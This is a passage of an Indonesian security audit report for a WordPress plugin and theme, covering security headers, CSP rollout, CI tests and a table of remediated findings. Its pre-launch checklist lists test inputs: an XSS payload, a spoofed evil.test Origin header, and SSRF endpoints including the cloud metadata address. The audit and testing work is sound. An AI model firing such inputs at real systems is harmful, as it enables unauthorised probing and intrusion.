Grep atas `X-Frame-Options|Content-Security-Policy|X-Content-Type-Options|Referrer-Policy|Strict-Transport-Security|Permissions-Policy|send_headers|header(` di seluruh kode orisinal hanya menemukan **2 hasil**, keduanya `Cache-Control` (`engagement.php:177`, `layar-katalog-core.php:2265`). Tidak ada header keamanan apa pun yang dikirim dari tema maupun plugin. (WordPress core hanya mengirim `X-Frame-Options: SAMEORIGIN` untuk halaman login/admin, **bukan** untuk frontend.)

> **Status: 🟡 tahap 1 (1.4.1) + tahap 2 (1.5.0) + tahap 3 (1.7.0) diterapkan; pemblokiran nyata tinggal dinyalakan di situs hidup.** Tahap 1: `nosniff`, `Referrer-Policy`, `X-Frame-Options`, `Permissions-Policy`, dan HSTS, semuanya dapat diubah lewat filter `lkc_security_headers`. Tahap 2: **CSP kini dikirim** sebagai `Content-Security-Policy-Report-Only` dengan `report-uri` menuju kolektor `POST lkc/v1/csp-report`, plus halaman **Alat → Log Keamanan** tab CSP untuk membacanya (lihat *Remediasi P1*). Tahap 3 (1.7.0): `lkc_csp_strict` melepas `'unsafe-inline'` dan `'unsafe-eval'` dari `script-src`/`style-src`/`default-src` dan menggantinya dengan nonce per-request, distempel ke semua elemen inline lewat `wp_script_attributes`/`wp_style_attributes` (jadi keluaran inline milik core ikut tertutup) dan ke kode iklan administrator lewat `layarkatalog_stamp_csp_nonce()`. Atribut `style=` inline di `front-page.html` dipindah ke CSS karena atribut gaya tidak bisa membawa nonce (F-17). Tab CSP kini menyusun snippet allowlist siap tempel dari laporan pelanggaran, dan `tests/js/csp-audit.mjs` bisa memprakirakan halaman mana yang akan rusak **sebelum** saklar itu disentuh (dijelaskan di bagian *Persiapan eksekusi situs-hidup*). Yang belum: **menjalankan** siklus itu di situs hidup — pra-uji dengan auditor, strict + `report-only` seminggu, tempel snippet, baru `lkc_csp_mode` → `'enforce'`. Rencana bertahap di bawah tetap berlaku.

**Rekomendasi — pasang di plugin (hook `send_headers`) agar tidak bergantung tema:**

```php
add_action( 'send_headers', function () {
    if ( headers_sent() || is_admin() ) {
        return;
    }
    header( 'X-Content-Type-Options: nosniff' );
    header( 'Referrer-Policy: strict-origin-when-cross-origin' );
    header( 'X-Frame-Options: SAMEORIGIN' );
    header( 'Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=()' );
    if ( wp_is_serving_https() ) {
        header( 'Strict-Transport-Security: max-age=31536000; includeSubDomains' );
    }
    header( "Content-Security-Policy: default-src 'self'; "
        . "script-src 'self' 'unsafe-inline' https://*.googletagservices.com https://*.googleapis.com; "
        . "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
        . "font-src 'self' https://fonts.gstatic.com; "
        . "img-src 'self' data: https:; "
        . "media-src 'self' https:; "            // sumber video MP4/WebM eksternal
        . "connect-src 'self' https://fcm.googleapis.com https://push.services.mozilla.com https://*.push.apple.com; "
        . "frame-ancestors 'self'; base-uri 'self'; form-action 'self'" );
} );
```

Urutan penerapan yang realistis (jangan langsung ketat, situs akan rusak):
1. **Tahap 1 (aman):** `nosniff`, `Referrer-Policy`, `X-Frame-Options`, `Permissions-Policy`, HSTS.
2. **Tahap 2:** `Content-Security-Policy-Report-Only` dengan `report-uri`/`report-to` selama 1–2 minggu, kumpulkan violation.
3. **Tahap 3:** aktifkan CSP enforcing.

Perhatian khusus proyek ini: **kode iklan** (`layarkatalog_output_global_ad_code`, `layarkatalog_ad_slot_shortcode`) menyisipkan script pihak ketiga arbitrer ke `wp_head` → CSP **harus** meng-allowlist domain penyedia iklan, dan `'unsafe-inline'` pada `script-src` praktis tidak bisa dihindari selama fitur iklan inline ada. Pertimbangkan memindahkan kode iklan ke berkas yang di-host sendiri atau memakai nonce/hash. Header juga perlu diset di level web server/CDN (Nginx `add_header`, Cloudflare Transform Rules) supaya tetap ada pada respons statis dan error page.

Tambahan yang terkait: **F-07** — `service-worker.js` menyimpan respons HTML same-origin ke Cache Storage tanpa memeriksa `response.ok` maupun status login (`service-worker.js:70-101`). Di perangkat bersama, HTML yang dipersonalisasi (admin bar, state login) bisa disajikan ke pengguna berikutnya, dan halaman 404/500 bisa ter-cache. **Fix:** lewati cache bila `document.cookie` memuat `wordpress_logged_in_`, dan hanya `cache.put()` bila `response.ok && response.type === 'basic'`.

---

### 20. Tes security sebelum live — ❌ GAGAL

> **Status: ✅ CI + suite uji selesai di 1.6.0, diperluas dan dijadikan blocking di 1.7.0; uji di situs hidup punya skripnya tetapi belum dijalankan.** `.github/workflows/ci.yml` menjalankan empat job pada setiap push dan PR: `php -l` atas **semua** berkas PHP (vendor dikecualikan), `node --check` atas semua JS, suite PHP **254 assertion** atas logika keamanan dengan WordPress di-*stub*, suite service worker **18 assertion**, suite DOM player **22 assertion**, suite komparator PHPCS **22 assertion**, suite pengaman skrip staging **24 assertion**, `composer audit --locked`, dan PHPCS/WPCS yang kini **blocking atas pelanggaran baru**. Harness hidup di `tests/` beserta runner WebAssembly sehingga bisa dijalankan tanpa PHP terpasang. Kedua suite JS menerima `--previous` untuk menjalankan assertion yang sama terhadap `git HEAD`: HEAD gagal 9/18 (service worker) dan 8/22 (player). **Temuan F-15 — fatal parse error di berkas utama plugin — ditemukan persis oleh langkah `php -l` yang sekarang ada di CI**, dan **F-16 — duplikasi `<track>` subtitle — ditemukan oleh suite DOM itu**. Sejak 1.7.0 job PHPCS blocking atas pelanggaran yang dimasukkan sebuah perubahan (dibandingkan terhadap revisi basisnya, dicocokkan per sniff + pesan, bukan per nomor baris), dan uji aktivasi di staging punya skripnya: `tests/wp/smoke-activate.sh`. Ronde persiapan menambah dua suite yang juga jalan di CI: `tests/php/activation.test.php` (**81 assertion** — apa yang benar-benar didaftarkan aktivasi, termasuk pemindai yang menuntut setiap callback yang direferensikan enam berkas registrasi itu ada fungsinya) dan `tests/js/csp-audit.test.js` (**59 assertion** untuk auditor CSP statis) serta `tests/js/csp-snippet-review.test.js` (**105 assertion** untuk pemeriksa snippet mu-plugin, yang menjalankan snippet di PHP 8.2 sungguhan dan membandingkan header yang dihasilkannya). Yang tetap tertunda: **menjalankan** skrip itu di staging, uji lintas browser, dan pengiriman push nyata dari provider.

Kondisi repo saat ini:
- **Tidak ada test** — `find -iname "*test*"` di luar `vendor/` = 0 berkas. Tidak ada PHPUnit, tidak ada `phpunit.xml`, tidak ada test JS.
- **Tidak ada CI** — tidak ada direktori `.github/`, tidak ada `.yml`/`.yaml` sama sekali.
- **Tidak ada static analysis/lint config** — tidak ada `phpcs.xml`/`.phpcs.xml.dist`, tidak ada `phpstan.neon`, tidak ada `.eslintrc`, tidak ada `phpstan`/`phpcs` di `composer.json` (hanya 2 dependency runtime).
- `CONTRIBUTING.md:12` meminta kontributor "menjalankan PHP lint dan JavaScript syntax check" — tetapi **tidak ada alat yang disediakan** untuk melakukannya.
- `README.md` (bagian *Validation status*) jujur menyatakan: aktivasi WordPress penuh, uji visual lintas-browser, dan pengiriman push live **belum diuji** di staging.
- `php` bahkan tidak tersedia di lingkungan audit ini, jadi lint tidak bisa dijalankan sebagai bagian audit — ini sendiri menunjukkan tidak ada toolchain yang terdefinisi.

**Rekomendasi — definisi "security-tested" sebelum go-live:**

*Otomatis di CI (GitHub Actions):*
1. `php -l` untuk semua `.php` (PHP 8.2 + 8.3 matrix).
2. `node --check` untuk semua `.js`.
3. **PHP_CodeSniffer + WordPress Coding Standards** dengan ruleset `WordPress-Extra` + `WordPress-Docs` (menangkap output tanpa escape, akses superglobal tanpa unslash/sanitize, SQL tanpa prepare).
4. **PHPStan** level 6 + `szepeviktor/phpstan-wordpress` (menangkap variabel tak terdefinisi seperti F-08).
5. `composer audit` + `composer outdated --direct` (gagal bila ada advisory).
6. Unit test PHPUnit dengan `wp-env`/`wp-tests-lib` untuk: sanitizer (`lkc_sanitize_video_url`, `lkc_validate_push_endpoint`, `lkc_decode_base64url_key`), permission callback REST, dan handler `admin_post_*` (termasuk kasus nonce salah & kapabilitas kurang).

*Manual di staging (checklist pra-live):*
- [ ] Registrasi user Author → buat episode berjudul `<img src=x onerror=alert(1)>` → putar episode sebelumnya sampai overlay autoplay muncul → **tidak boleh** ada alert (uji F-01).
- [ ] `curl -H "Origin: https://evil.test" -i https://staging/wp-json/lkc/v1/ratings/1` → tidak boleh ada `Access-Control-Allow-Origin: https://evil.test` berpasangan dengan `Allow-Credentials: true`.
- [ ] 100 request `POST /lkc/v1/push/subscribe` dari satu IP dalam 1 menit → harus mulai `429`.
- [ ] `POST /push/subscribe` dengan endpoint `https://127.0.0.1/x`, `https://169.254.169.254/latest/meta-data/`, `https://evil-fcm.googleapis.com.attacker.tld/x`, `http://fcm.googleapis.com/x` → semua **400**.
- [ ] `POST /ratings/{id}` tanpa `X-WP-Nonce` sebagai user login → **401**; dengan nonce → 200; nonce milik user lain → **403**.
- [ ] `POST /ratings/{draft_id}` → **404**; `POST /ratings/{id}` dengan `rating=99` / `rating=abc` / `rating=5.5` → **400**.
- [ ] Akses `wp-admin/admin-post.php?action=lkc_clear_push_subscriptions` sebagai Subscriber dan tanpa login → ditolak; tanpa nonce → ditolak.
- [ ] Aktifkan `WP_DEBUG_LOG`, paksa 1 push gagal, periksa `debug.log` → **tidak boleh** ada URL endpoint lengkap (uji F-06).
- [ ] `curl -I https://situs/` → verifikasi semua header poin 19 hadir; uji `securityheaders.com` minimal **A**.
- [ ] Uji klik-jacking: iframe situs dari origin lain → harus diblokir.
- [ ] Verifikasi `wp-content/debug.log`, `composer.lock`, `vendor/composer/installed.json`, dan `wp-config.php` **tidak** dapat diunduh via HTTP.
- [ ] Jalankan scan eksternal: OWASP ZAP baseline + `wpsec`/`wpscan` terhadap staging.
- [ ] Uji restore backup sesuai checklist poin 18.
- [ ] Nonaktifkan `WP_DEBUG`/`WP_DEBUG_DISPLAY`, pastikan `DISALLOW_FILE_EDIT` aktif, dan 2FA untuk semua akun admin.

---

## Temuan tambahan di luar 20 poin

| ID | Temuan | Severity | Status | Lokasi |
|---|---|---|---|---|
| **F-01** | DOM XSS: judul episode disisipkan ke `innerHTML` overlay autoplay → Author dapat menyerang semua pengunjung & admin | **Tinggi** | ✅ **Diperbaiki 1.4.1** (teruji jsdom) | `plugins/layar-katalog-core/player.js:79-148` |
| **F-02** | Tidak ada rate limiting pada 6 route REST (2 di antaranya tulis anonim) | **Tinggi** | ✅ **Diperbaiki 1.4.1** (429 + Retry-After, batas 5000 langganan) | `includes/security.php:75-206`, `includes/web-push.php:253-271` |
| **F-03** | Tidak ada security header (CSP/HSTS/XFO/nosniff/Referrer-Policy/Permissions-Policy) | **Tinggi** | 🟡 **Tahap 1 selesai 1.4.1, tahap 2 selesai 1.5.0, tahap 3 selesai 1.7.0** (CSP report-only + kolektor + mode ketat berbasis nonce + generator allowlist dari laporan). Tinggal menekan `enforce` di situs hidup setelah membaca laporan seminggu | `includes/security.php:41-341`, `includes/audit.php:359-651` |
| **F-04** | Tidak ada test/CI/static analysis sama sekali | **Tinggi** | ✅ **Diperbaiki 1.6.0** (GitHub Actions 4 job + `tests/`: 152 PHP, 18 SW, 22 DOM assertion; PHPCS advisory) | `.github/workflows/ci.yml`, `tests/`, `phpcs.xml.dist` |
| **F-05** | Nilai `localStorage` dirangkai ke atribut via `innerHTML` | Rendah | ✅ **Diperbaiki 1.4.1** | `plugins/layar-katalog-core/assets/engagement.js:329-338` |
| **F-06** | `error_log()` mencetak pesan exception Guzzle yang memuat endpoint push lengkap | **Sedang** | ✅ **Diperbaiki 1.4.1** | `includes/web-push.php:37-65, 481, 515` |
| **F-07** | Service worker meng-cache HTML tanpa cek `response.ok`/status login → risiko privasi di perangkat bersama | **Sedang** | ✅ **Diperbaiki 1.5.0** (SW v2, teruji 18 assertion diferensial: versi lama gagal 10) | `plugins/layar-katalog-core/service-worker.js:11-99, 178-199` |
| **F-08** | Bug: `$version` tidak terdefinisi di `layarkatalog_enqueue_google_fonts()` → PHP warning + cache-busting mati | Rendah (kualitas) | ✅ **Diperbaiki 1.6.2** | `themes/layar-katalog/functions.php:351` |
| **F-09** | Tidak ada `index.php` di direktori plugin/tema; `vendor/composer/installed.json` & `composer.lock` dapat dibaca publik → version disclosure | Rendah | ✅ **Diperbaiki 1.6.4/1.6.0** (`vendor/.htaccess` deny-all + 8 `index.php`; nginx perlu blok `location` sendiri) | `plugins/layar-katalog-core/vendor/.htaccess` |
| **F-10** | URL video/subtitle masih mengizinkan `http://` dan host apa pun (mixed content, bukan SSRF) | Rendah | ✅ **Diperbaiki 1.6.0** (HTTPS wajib, filter `lkc_allow_insecure_media_urls` + allowlist host `lkc_allowed_media_hosts`; teruji 16 assertion) | `layar-katalog-core.php:410-497` |
| **F-11** | Tidak ada batas atas parameter `page` pada `/catalog/search` → OFFSET mahal | Rendah | ✅ **Diperbaiki 1.4.1** (cap 500) | `layar-katalog-core.php:2164, 2264` |
| **F-12** | Tidak ada pruning langganan push basi; tabel hanya menyusut saat push service melaporkan expired | Rendah | ✅ **Diperbaiki 1.6.0** (kolom `failure_count`/`last_failure_at` + cron harian, 5 kegagalan atau 30 hari; teruji 9 assertion) | `includes/web-push.php:530-650`, `includes/engagement.php:37-49` |
| **F-13** | Tidak ada audit trail untuk aksi destruktif admin (rotasi kunci, hapus semua langganan, simpan kode iklan) | **Sedang** | ✅ **Diperbaiki 1.5.0** (tabel + Alat → Log Keamanan, IP/UA di-HMAC, retensi 90/30 hari) | `includes/audit.php`, `includes/web-push.php:113,151,174`, `themes/layar-katalog/functions.php:644-679` |
| **F-15** | **Fatal parse error di `layar-katalog-core.php`** — `foreach ( $title_meta … ) {` terganti `$episode_meta = array(`, sehingga plugin tidak dapat diaktifkan sama sekali dan meta judul tidak pernah terdaftar di REST | **Kritis** | ✅ **Diperbaiki 1.5.0** (ditemukan lewat `php -l` PHP 8.2.33 atas semua berkas; ada sejak commit pertama) | `layar-katalog-core.php:272` |
| **F-16** | Ganti sumber video **menduplikasi** `<track>` subtitle: `video.src = …` tidak menghapus anak `<track>`, sehingga blok "pertahankan subtitle" menambah salinan baru tiap kali (2 track setelah ganti pertama, 4 setelah kedua) | Rendah (kualitas) | ✅ **Diperbaiki 1.6.0** (ditemukan oleh suite DOM baru; HEAD gagal 2 assertion ini) | `player.js:45-61` |
| **F-14** | Cache-busting `player.js` memakai string versi beku, sehingga perbaikan JS bisa tidak sampai ke browser yang menyimpan salinan lama | Rendah | ✅ **Diperbaiki 1.4.1** (`filemtime()`) | `layar-katalog-core.php:973-985` |

---

## Rencana perbaikan berprioritas

**P0 — sebelum live (effort kecil, dampak besar): ✅ SELESAI semuanya di 1.4.1 / 1.6.2**
1. ✅ F-01: `innerHTML` overlay di `player.js` diganti `createElement`/`textContent` + validasi protokol URL.
2. ✅ F-06: `getMessage()` dihapus dari `error_log` push; diganti stage + exception class + status code + prefix hash.
3. ✅ F-03 tahap 1: `nosniff`, `Referrer-Policy`, `X-Frame-Options`, `Permissions-Policy`, HSTS via `send_headers`.
4. ✅ F-02: rate limiter transien untuk semua route `lkc/v1` + batas 5000 langganan.
5. ✅ F-08 & F-11: variabel `$version` dan cap `page` (500).
6. ✅ Bonus F-05 (hardening `localStorage`) & F-14 (cache-busting `player.js` via `filemtime`).

**P1 — sebelum rilis publik 1.5: ✅ SELESAI semuanya di 1.5.0 / 1.6.3 (2026-10-17)**
6. ✅ F-15 *(temuan baru saat mengerjakan P1)*: fatal parse error di berkas utama plugin diperbaiki; semua 9 berkas PHP kini lolos *parse* PHP 8.2.33.
7. ✅ CORS: allowlist origin untuk `lkc/v1` di `rest_pre_serve_request` **dan** `rest_post_dispatch`, `Vary: Origin` selalu, header core dihapus untuk origin tak dikenal (`lkc_allowed_cors_origins`).
8. ✅ F-03 tahap 2: CSP `Report-Only` (12 direktif) + kolektor `POST lkc/v1/csp-report` yang mengagregasi + halaman pembacaan. `enforce` sengaja menunggu allowlist domain iklan.
9. ✅ F-07: service worker `lk-shell-v2` — hanya respons `ok`/`basic`/same-origin tanpa `X-LK-Personalized` dan tanpa `private`/`no-store`, URL preview/customizer dikecualikan, cache `lk-*` lama dibuang saat `activate`, `notificationclick` dibatasi same-origin.
10. ✅ Skema `args` untuk `/push/subscribe` & `/push/unsubscribe` + batas ukuran body 8 KB (`413`) untuk semua route tulis `lkc/v1`.
11. ✅ F-13: tabel `wp_lkc_audit_log`, halaman **Alat → Log Keamanan**, allowlist aksi, IP/UA di-HMAC, cron retensi 90/30 hari.

**P2 — hardening & proses: ✅ SELESAI semuanya di 1.6.0 / 1.6.4 (2026-10-17)**
12. ✅ F-04: GitHub Actions empat job — `php -l` untuk **semua** berkas PHP (F-15 membuktikan ini wajib, bukan formalitas), `node --check`, suite PHP 152 assertion, suite service worker 18 assertion, suite DOM player 22 assertion, `composer audit --locked`, dan PHPCS/WPCS advisory. Ketiga harness dipindah dari luar repo ke `tests/`, lengkap dengan runner WebAssembly agar bisa dijalankan tanpa PHP terpasang.
13. ✅ F-12: kolom `failure_count`/`last_failure_at` + cron harian `lkc_prune_stale_push_subscriptions` (5 kegagalan atau 30 hari gagal; baris yang belum pernah gagal tidak disentuh).
14. ✅ F-09: `vendor/.htaccess` deny-all (Apache 2.2 & 2.4, ekuivalen nginx terdokumentasi) + `index.php` di delapan direktori plugin/tema.
15. ✅ F-10: `lkc_is_allowed_media_url()` menolak `http://` dan host di luar `lkc_allowed_media_hosts`.
16. ✅ Poin 18: `docs/BACKUP-RESTORE.md` — inventaris (termasuk **keempat** tabel plugin dan salt `wp-config.php`), perintah dump/restore, lima mode kegagalan, checklist verifikasi 12 butir, dan log latihan kuartalan.
17. ✅ Poin 9: kunci privat VAPID disimpan sebagai envelope AES-256-GCM dengan kunci turunan salt; nilai lama dimigrasikan otomatis dan kegagalan dekripsi dilaporkan ke admin.
18. ✅ Bonus F-16: duplikasi `<track>` subtitle saat ganti sumber video diperbaiki.

**P3 — menutup sisa P2: ✅ SELESAI semuanya di 1.7.0 / 1.7.0 (2026-10-17)**
19. ✅ F-03 tahap 3: `lkc_csp_strict` melepas `'unsafe-inline'`/`'unsafe-eval'` dan menggantinya dengan nonce per-request yang distempel ke semua elemen inline, termasuk milik WordPress core dan kode iklan administrator. F-17 (atribut `style=` inline di `front-page.html`) dipindah ke CSS karena atribut gaya tidak bisa membawa nonce.
20. ✅ Jalan ke `enforce`: tab CSP menyusun snippet `lkc_content_security_policy` siap tempel dari laporan pelanggaran, lengkap dengan penjelasan untuk `inline`/`eval`/`data` yang memang tidak bisa di-allowlist.
21. ✅ Job PHPCS dibalik menjadi **blocking atas pelanggaran baru** (`tests/phpcs-regression.mjs`), sehingga utang gaya kode lama tidak mewarnai check yang harusnya menahan kode baru.
22. ✅ Uji aktivasi di staging diotomatiskan: `tests/wp/smoke-activate.sh`.
23. ✅ Latihan restore kuartalan diotomatiskan: `tests/wp/rehearse-restore.sh` + §6.1 di runbook; pengaman destruktif keduanya diuji di CI oleh `tests/wp/guards.test.sh`.

**Tersisa — benar-benar hanya eksekusi di situs hidup:**
24. Jalankan `tests/wp/smoke-activate.sh` di staging (dengan `--activate`), lalu sekali lagi setelah deploy produksi pertama.
25. Pra-uji setiap template dengan `node tests/js/csp-audit.mjs --url=<situs> --strict`, lalu nyalakan `lkc_csp_strict` sambil tetap `report-only` seminggu → tempel snippet dari tab CSP → periksa berkas itu dengan `node tests/csp-snippet-review.mjs <berkas>` → jalankan auditor sekali lagi → `lkc_csp_mode` → `'enforce'`.
26. Jalankan latihan restore pertama dan isi baris lognya di `docs/BACKUP-RESTORE.md` §6.
27. Uji lintas browser dan pengiriman push nyata dari provider.
28. Checklist operasional pra-live: `WP_DEBUG_DISPLAY` mati, `DISALLOW_FILE_EDIT` aktif, 2FA semua admin, `debug.log` tidak terjangkau HTTP, `lkc_rate_limit_ip` dikonfigurasi di belakang CDN, `includeSubDomains` dilepas dari HSTS bila ada layanan non-HTTPS di subdomain.
